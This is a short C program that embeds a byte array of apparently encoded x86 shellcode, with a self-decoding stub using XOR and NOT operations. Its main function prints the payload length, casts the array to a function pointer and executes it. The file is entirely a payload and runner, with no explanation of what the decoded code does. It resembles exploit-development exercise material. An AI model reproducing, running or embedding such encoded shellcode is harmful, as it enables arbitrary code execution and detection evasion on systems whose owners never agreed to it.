#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x20\x5e\x31\xc0\x31\xdb\x31\xc9\x8a\x0e\x80\xe9\xaa\x74\x17\x8a\x46\x01\x8a\x1e\x30\xc3\xf6\xd0\x88\x1e\x88\x46\x01\x46\x46\xeb\xe7\xe8\xdb\xff\xff\xff\x0e\x3f\xc7\x97\xff\xd0\xe4\x97\xb8\xd0\xf4\x96\x18\x76\x4c\xaf\x94\x1d\x25\x76\xae\x4f\x39\x32\xef\x6f\xaa\xaa";

main() {
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}	
